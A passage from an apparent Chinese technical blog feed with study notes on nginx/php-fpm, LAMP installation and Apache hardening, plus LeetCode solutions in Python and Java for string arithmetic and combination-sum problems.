href="https://www.cnblogs.com/donghui521/p/10334776.html">https://www.cnblogs.com/donghui521/p/10334776.html</a></p><p>目前主流的nginx+php的运行原理如下：<br>1、nginx的worker进程直接管理每一个请求到nginx的网络请求。<br>2、对于php而言，由于在整个网络请求的过程中php是一个cgi程序的角色，所以采用名为php-fpm的进程管理程序来对这些被请求的php程序进行管理。php-fpm程序也如同nginx一样，需要监听端口，并且有master和worker进程。worker进程直接管理每一个php进程。<br>3、关于fastcgi：fastcgi是一种进程管理器，管理cgi进程。市面上有多种实现了fastcgi功能的进程管理器，php-fpm就是其中的一种。再提一点，php-fpm作为一种fast-cgi进程管理服务，会监听端口，一般默认监听9000端口，并且是监听本机，也就是只接收来自本机的端口请求，所以我们通常输入命令 netstat -nlpt|grep php-fpm 会得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp    0   0 127.0.0.1:9000       0.0.0.0:*          LISTEN   1057&#x2F;php-fpm</span><br></pre></td></tr></table></figure><p>这里的127.0.0.1:9000 就是监听本机9000端口的意思。<br>4、关于fastcgi的配置文件，目前fastcgi的配置文件一般放在nginx.conf同级目录下，配置文件形式，一般有两种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastcgi.conf  和 fastcgi_params。不同的nginx版本会有不同的配置文件，这两个配置文件有一个非常重要的区别：fastcgi_parames文件中缺少下列配置：</span><br><span class="line">fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span><br></pre></td></tr></table></figure><p>我们可以打开<code>fastcgi_params</code>文件加上上述行，也可以在要使用配置的地方动态添加。使得该配置生效。<br>5、当需要处理php请求时，nginx的worker进程会将请求移交给php-fpm的worker进程进行处理，也就是最开头所说的nginx调用了php，其实严格得讲是nginx间接调用php。 </p></blockquote><h3 id="六、LNMP的缺点"><a href="#六、LNMP的缺点" class="headerlink" title="六、LNMP的缺点"></a>六、LNMP的缺点</h3><p>PHP-FPM的负载能力有限，如果访问量特别大的话，PHP-FPM容易陷入僵死状态，浏览器显示：502 bad gateway错误。</p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>43-字符串相乘</title>
      <link href="/2020/07/21/Leetcode/43.%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B8%E4%B9%98/"/>
      <url>/2020/07/21/Leetcode/43.%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B8%E4%B9%98/</url>
      
        <content type="html"><![CDATA[<h2 id="43、字符串相乘"><a href="#43、字符串相乘" class="headerlink" title="43、字符串相乘"></a>43、字符串相乘</h2><h3 id="题目-grey-question-："><a href="#题目-grey-question-：" class="headerlink" title="题目:grey_question:："></a>题目:grey_question:：</h3><p><a href="https://imgchr.com/i/UTG3tJ"><img src="https://s1.ax1x.com/2020/07/21/UTG3tJ.png" alt="UTG3tJ.png"></a></p><h3 id="题解-ballot-box-with-check-："><a href="#题解-ballot-box-with-check-：" class="headerlink" title="题解:ballot_box_with_check:："></a>题解:ballot_box_with_check:：</h3><p>和<a href="C:\Users\18265\Desktop\Leetcode\415、字符串相加.md">字符串相加</a>相同采用竖式运算思想，分析乘法的竖式运算和加法的竖式运算整体框架不变，都采用双指针，重点在于num1和num2需要选择num1循环一次和num2循环num1次。每当一个num1的元素循环相乘num2的元素后得出一个字符串结果后，左移一位（右边补个0）与上一个结果进行累加。这个累加过程和<a href="C:\Users\18265\Desktop\Leetcode\415、字符串相加.md">字符串相加</a>相同。</p><blockquote><p>竖式运算思想，双指针，左移补0累加得结果</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">multiply</span>(<span class="params">self, num1: str, num2: str</span>) -&gt; str:</span></span><br><span class="line">        <span class="keyword">if</span> int(num1) == <span class="number">0</span> <span class="keyword">or</span> int(num2) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">        i, carry = len(num1) - <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">        res = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment">#num1循环一次，逐个与所有num2相乘</span></span><br><span class="line">        <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">            carry = <span class="number">0</span></span><br><span class="line">            str1 = <span class="string">&quot;&quot;</span></span><br><span class="line">            j = len(num2) - <span class="number">1</span></span><br><span class="line">            <span class="comment">#num2循环num1次</span></span><br><span class="line">            <span class="keyword">while</span> j &gt;= <span class="number">0</span>:</span><br><span class="line">                tmp = int(num1[i]) * int(num2[j]) + carry</span><br><span class="line">                carry = tmp // <span class="number">10</span></span><br><span class="line">                <span class="comment">#拼接出此层的相乘结果</span></span><br><span class="line">                str1 = str(tmp % <span class="number">10</span>) + str1</span><br><span class="line">                j = j - <span class="number">1</span></span><br><span class="line">            str1 = str(carry) + str1 <span class="keyword">if</span> carry !=<span class="number">0</span> <span class="keyword">else</span> str1</span><br><span class="line">            <span class="comment">#得出结果后根据循环层数补0（左移）</span></span><br><span class="line">            <span class="keyword">for</span> pp <span class="keyword">in</span> range(len(num1) - <span class="number">1</span> - i):</span><br><span class="line">                str1 = str1 + <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="comment">#逐层结果累加</span></span><br><span class="line">            res = self.addStrings(res, str1)</span><br><span class="line">            i = i - <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="comment">#字符串相加</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addStrings</span>(<span class="params">self, num1: str, num2: str</span>):</span></span><br><span class="line">        res = <span class="string">&quot;&quot;</span></span><br><span class="line">        i, j, carry = len(num1) - <span class="number">1</span>, len(num2) - <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &gt;= <span class="number">0</span> <span class="keyword">or</span> j &gt;= <span class="number">0</span>:</span><br><span class="line">            n1 = int(num1[i]) <span class="keyword">if</span> i &gt;= <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            n2 = int(num2[j]) <span class="keyword">if</span> j &gt;= <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            tmp = n1 + n2 + carry</span><br><span class="line">            carry = tmp // <span class="number">10</span></span><br><span class="line">            res = str(tmp % <span class="number">10</span>) + res</span><br><span class="line">            i, j = i - <span class="number">1</span>, j - <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span> + res <span class="keyword">if</span> carry == <span class="number">1</span> <span class="keyword">else</span> res</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>415-字符串相加</title>
      <link href="/2020/07/21/Leetcode/415%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B8%E5%8A%A0/"/>
      <url>/2020/07/21/Leetcode/415%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B8%E5%8A%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="415、字符串相加"><a href="#415、字符串相加" class="headerlink" title="415、字符串相加"></a>415、字符串相加</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://leetcode-cn.com/problems/add-strings/">https://leetcode-cn.com/problems/add-strings/</a></p><p><a href="https://imgchr.com/i/UofL60"><img src="https://s1.ax1x.com/2020/07/21/UofL60.png" alt="UofL60.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>此题关键是如何处理长整数的存储，使用字符串转数字的方法直接处理肯定会溢出，因为题目规定字符串numX长度&lt;=5100，这种大数无法直接存储，所以要求返回字符串。因此需要在不断计算的过程中，一位一位的加入字符串数组。</p><p>计算的方式就是模拟人脑计算的方式，从尾巴开始双指针计算，并记录进位。比较简单。重点就在于字符转换和拼接，对于python来说很方便。</p><blockquote><p>重点处理过长大数，模拟人脑双指针运算，字符串拼接</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addStrings</span>(<span class="params">self, num1: str, num2: str</span>) -&gt; str:</span></span><br><span class="line">        res = <span class="string">&quot;&quot;</span></span><br><span class="line">        i, j, carry = len(num1) - <span class="number">1</span>, len(num2) - <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &gt;= <span class="number">0</span> <span class="keyword">or</span> j &gt;= <span class="number">0</span>:</span><br><span class="line">            n1 = int(num1[i]) <span class="keyword">if</span> i &gt;= <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            n2 = int(num2[j]) <span class="keyword">if</span> j &gt;= <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            tmp = n1 + n2 + carry</span><br><span class="line">            carry = tmp // <span class="number">10</span></span><br><span class="line">            res = str(tmp % <span class="number">10</span>) + res</span><br><span class="line">            i, j = i - <span class="number">1</span>, j - <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span> + res <span class="keyword">if</span> carry == <span class="number">1</span> <span class="keyword">else</span> res</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7、LAMP架构搭建</title>
      <link href="/2020/07/21/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/7%E3%80%81LAMP%E6%9E%B6%E6%9E%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/07/21/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/7%E3%80%81LAMP%E6%9E%B6%E6%9E%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="LAMP架构搭建"><a href="#LAMP架构搭建" class="headerlink" title="LAMP架构搭建"></a>LAMP架构搭建</h2><h3 id="一、什么是LAMP架构"><a href="#一、什么是LAMP架构" class="headerlink" title="一、什么是LAMP架构"></a>一、什么是LAMP架构</h3><p>LAMP架构就是Linux、Apache、Mysql、Php结合起来的运行环境。LAMP是比较流行的Web服务架构。</p><h3 id="二、部署Mysql服务端"><a href="#二、部署Mysql服务端" class="headerlink" title="二、部署Mysql服务端"></a>二、部署Mysql服务端</h3><p>1、yum源安装：<code>yum install -y mysql-server</code></p><p>2、启动Mysql服务：<code>service mysqld start</code></p><p>3、第一次修改root密码：<code>mysqladmin -u root password &quot;密码&quot;</code></p><p>4、第n次(n&gt;1)修改root密码：<code>mysqladmin -u root -p password &quot;新密码&quot;</code>,然后提示输入旧密码</p><p>5、登录数据库：<code>mysql -u root -p</code></p><h3 id="三、部署PHP语言环境"><a href="#三、部署PHP语言环境" class="headerlink" title="三、部署PHP语言环境"></a>三、部署PHP语言环境</h3><p>1、yum源安装：<code>yum install -y php</code></p><p>2、yum源安装PHPmysql驱动库：<code>yum install -y php-mysql/php-mbstring</code></p><p>3、php-mbstring在第二盘Centos光盘中，安全性考虑先卸载，再安装新的光盘：<code>umount /dev/cdrom</code>，换好光盘后再挂载光盘<code>mount /dev/cdrom /media</code></p><blockquote><p>因为手动挂载光盘到/media，yum配置以前的文件路径是/media/CentosXXX所以要将配置改为/media。而且这里要注意，光盘2中没有依赖文件列表，因此只能单纯安装某个依赖包，无法自动处理依赖，解决方法是挂载光盘1利用光盘1中的依赖文件列表先创建一个cache。然后光盘2就可以在cache中找到依赖文件列表处理依赖了。</p></blockquote><h3 id="四、PHP配置文件分析"><a href="#四、PHP配置文件分析" class="headerlink" title="四、PHP配置文件分析"></a>四、PHP配置文件分析</h3><blockquote><p>/etc/php.ini</p></blockquote><p>229行左右 ：<code>short_open_tag = On</code>        #开启PHP短标签模式，不需要&lt;?php，只需要&lt;?即可。</p><blockquote><p>配置好后需要重启Apache，测试一个致命的“裸体”函数：<code>&lt;? phpinfo(); ?&gt;</code></p><p>PHP必须依靠Web服务器才能工作，在Apache中PHP只是一个网页程序</p></blockquote><h3 id="五、PHP程序的工作流程"><a href="#五、PHP程序的工作流程" class="headerlink" title="五、PHP程序的工作流程"></a>五、PHP程序的工作流程</h3><p>1、WEB浏览器请求一个url操作。</p><p>2、如果是静态网页，那么Web服务器只需要正常返回HTML页面即可。</p><p>3、如果是PHP页面(XXX.php)，那么Web服务器会委托系统中的<strong>PHP预处理器</strong>(Preprocessor)将请求的php文件解释为HTML静态页面返回给WEB浏览器。</p><p>​    这个将PHP文件解释为HTML页面的过程，由PHP解释器进行，期间可能会有一些数据库的增删改查等操作，将数据库中的数据拼接到HTML页面后返回给WEB浏览器，这就是动态网页。</p><h3 id="六、PHPMyAdmin数据库WEB客户端软件"><a href="#六、PHPMyAdmin数据库WEB客户端软件" class="headerlink" title="六、PHPMyAdmin数据库WEB客户端软件"></a>六、PHPMyAdmin数据库WEB客户端软件</h3><p>一款基于PHP开发的数据库客户端Web管理页面，直接解压到<code>/var/www/html</code>下直接访问进行管理。</p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6、Apache网页服务器安全架构</title>
      <link href="/2020/07/21/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/6%E3%80%81Apache%E7%BD%91%E9%A1%B5%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/"/>
      <url>/2020/07/21/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/6%E3%80%81Apache%E7%BD%91%E9%A1%B5%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="Apache网页服务器安全架构"><a href="#Apache网页服务器安全架构" class="headerlink" title="Apache网页服务器安全架构"></a>Apache网页服务器安全架构</h2><h3 id="一、什么是LAMP架构"><a href="#一、什么是LAMP架构" class="headerlink" title="一、什么是LAMP架构"></a>一、什么是LAMP架构</h3><p>LAMP架构就是Linux、Apache、Mysql、Php结合起来的运行环境。LAMP是比较流行的Web服务架构。</p><h3 id="二、Web服务工作原理"><a href="#二、Web服务工作原理" class="headerlink" title="二、Web服务工作原理"></a>二、Web服务工作原理</h3><p>1、用户在浏览器中执行一个请求操作</p><p>2、浏览器与网页服务器进程建立TCP连接</p><p>3、浏览器将请求操作按照Http协议打包为数据包发送到网页服务器</p><p>4、服务器进程对接受到的Http数据包解析，生成对应的响应Http数据包</p><p>5、将响应Http数据包发送给客户端浏览器</p><p>6、客户端浏览器对获得的应答Http数据包进行处理，显示等。</p><h3 id="三、Apache配置文件基本分析"><a href="#三、Apache配置文件基本分析" class="headerlink" title="三、Apache配置文件基本分析"></a>三、Apache配置文件基本分析</h3><p>57行左右：<code>ServerRoot &quot;/etc/httpd&quot;</code>    #Apach配置根路径</p><p>65行左右：<code>PidFIle run/httpd.pid</code>        #Apach服务的根进程号（相对配置根路径的相对路径）</p><p>136行左右：<code>Listen 80</code>        #Apache监听端口</p><p>150行后：<code>LoadModule XXXXX</code>        #Apache加载的一系列功能模块</p><p>221行左右：<code>Include conf.d/*.conf</code>        #导入的配置文件</p><p>242行左右：<code>User apache</code>        #配置Apache的进程用户</p><p>243行左右：<code>Group apache</code>        #配置Apache的进程组</p><p>292行左右：<code>DocumentRoot &quot;/var/www/html&quot;</code>        #Web网页的根目录</p><p>317-346行左右：<code>&lt;Directory &quot;/var/www/html&quot;&gt; XXXX &lt;/Directory&gt; </code>        #针对Web网页根目录的配置信息</p><h3 id="四、Apache服务器安全加固"><a href="#四、Apache服务器安全加固" class="headerlink" title="四、Apache服务器安全加固"></a>四、Apache服务器安全加固</h3><p><code>&lt;Directory &quot;/var/www/html&quot;&gt;</code></p><p><u>331行左右</u>：<code>Options FollowSymLinks</code>        #<strong>关闭目录共享功能</strong></p><p><u>343行左右</u>：<code>Order allow,deny</code>        #<strong>访问控制</strong>匹配列表中允许项，如果匹配不到全拒绝，下面写访问控制列表</p><blockquote><p>343行左右：<code>Order deny,allow</code>        #访问控制匹配列表中拒绝项，如果匹配不到全允许，下面写访问控制列表</p></blockquote><p><u>344行左右</u>：<code>Allow/Deny from all|host|env=[!]env-variable [host|env=[!]env-variable] ...</code>        #<strong>访问控制</strong>列表</p><blockquote><p>例子：拒绝整个网段 Deny from 192.168.1.</p></blockquote><p><u>345行左右</u>：<strong>设置主页通过认证的方式访问</strong></p><p>​    <code>authtype basic</code>    #认证类型<br>​    <code>authname &quot;随便&quot;</code>    #认证名称，会出现在认证提示语中<br>​    <code>authuserfile apache认证用户列表</code>    #specify认证用户的列表</p><blockquote><p>通过 <code>htppasswd -c 认证用户列表存放路径 认证用户列表名</code>来创建认证用户列表，通知注意对认证用户列表进行撤权，<code>chown apache </code>并且<code>chmod 400</code></p></blockquote><p>​    <code>require valid-user</code>    #允许此列表访问 </p><p><code>&lt;/Directory&gt; </code>        </p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>40-组合总和 ||</title>
      <link href="/2020/07/20/Leetcode/40%E3%80%81%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8C/"/>
      <url>/2020/07/20/Leetcode/40%E3%80%81%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="40、组合总和"><a href="#40、组合总和" class="headerlink" title="40、组合总和 ||"></a>40、组合总和 ||</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/U44N6K"><img src="https://s1.ax1x.com/2020/07/20/U44N6K.png" alt="U44N6K.png"></a></p><p>此题与<a href="C:\Users\18265\Desktop\Leetcode\39.组合总和.md">39、组合总和</a>是相同的题型，都要求得出的组合不能有重复的。唯一的不同是。39题数组元素不能重复，但组合中可以重复选择数组元素；而本题数组元素有重复，且组合中不能重复选择数组元素。</p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>如何去重：1、既然本题是数组元素中有重复项，并且最后回溯出的组合不能有重复，因此肯定要对数组进行排序，以及在判断中如若发现当前迭代项与上一个迭代项相同，则跳过此次迭代。（有点类似于<a href="C:\Users\18265\Desktop\Leetcode\15、三数之和&18、四数之和.md">15、三数之和</a>中去重的方法，排序、判断相邻项是否相同）2、每一层回溯迭代时，起点都为上一层递归传入的数组元素之后。</p><p>剩下得出组合的方式和39题相同，使用了<strong>回溯法</strong>，回溯树根为target，每个分支target都会减掉1个数组元素，直到target==0（满足）或者小于0（不满足）。回溯树的每一层迭代时的起点都是上一层递归传入的数组元素之后，这也是避免重复的方式之一。</p><blockquote><p>排序判断前后去重！每层回溯迭代时起点为上层传入点之后去重！获得组合的方法是回溯！根是target！递归减元素！直到零或负。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; combinationSum2(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">if</span> (candidates.length == <span class="number">0</span> || target &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        bfs(candidates, target, <span class="number">0</span>, list);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> target, <span class="keyword">int</span> start, List&lt;Integer&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>) &#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;(list));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; candidates.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; start &amp;&amp; candidates[i] == candidates[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(candidates[i]);</span><br><span class="line">            bfs(candidates, target - candidates[i], i + <span class="number">1</span>, list);</span><br><span class="line">            list.remove(list.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>39-组合总和</title>
      <link href="/2020/07/20/Leetcode/39%E3%80%81%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8C/"/>
      <url>/2020/07/20/Leetcode/39%E3%80%81%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="39、组合总和"><a href="#39、组合总和" class="headerlink" title="39、组合总和"></a>39、组合总和</h2><p><a href="https://leetcode-cn.com/problems/combination-sum/">https://leetcode-cn.com/problems/combination-sum/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/U4rU9e"><img src="https://s1.ax1x.com/2020/07/20/U4rU9e.png" alt="U4rU9e.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>此题要求给定数组中，任意组合数组元素的和等于target，返回所有符合条件的组合。并且数组元素可以重复的使用，但是最后得出的组合中不能有重复的。</p><p>首先，要想得出所有符合条件的组合，就要用的经典的回溯模型。</p><p><a href="https://imgchr.com/i/U4sl8g"><img src="https://s1.ax1x.com/2020/07/20/U4sl8g.png" alt="U4sl8g.png"></a></p><p><a href="https://imgchr.com/i/U4sJrn"><img src="https://s1.ax1x.com/2020/07/20/U4sJrn.png" alt="U4sJrn.png"></a></p><p>去重复的关键在于，每层递归都不会使用上一层递归使用过的数组元素。</p><blockquote><p>递归回溯减元素得组合，去重关键不要走老路。</p><p>AC题解：<a href="https://leetcode-cn.com/problems/combination-sum/solution/fei-chang-xiang-xi-de-di-gui-hui-su-tao-lu-by-re-2/">https://leetcode-cn.com/problems/combination-sum/solution/fei-chang-xiang-xi-de-di-gui-hui-su-tao-lu-by-re-2/</a></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; combinationSum(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">if</span> (candidates.length == <span class="number">0</span> || target &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        bfs(candidates, target, list, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> target, List&lt;Integer&gt; list, <span class="keyword">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(target == <span class="number">0</span>) &#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> ArrayList&lt;&gt;(list)); <span class="comment">//坑点，加入的list要new一个出来。否则一直在玩一个，最后给玩没了</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//i从start开始不使用上一层递归使用过的数组元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = start; i &lt; candidates.length; i++) &#123;</span><br><span class="line">            list.add(candidates[i]);<span class="comment">//做选择</span></span><br><span class="line">            bfs(candidates, target - candidates[i], list, i);</span><br><span class="line">            list.remove(list.size() - <span class="number">1</span>);<span class="comment">//撤销选择</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5、日志服务器的搭建</title>
      <link href="/2020/07/20/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/5%E3%80%81%E6%97%A5%E5%BF%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/07/20/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/5%E3%80%81%E6%97%A5%E5%BF%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
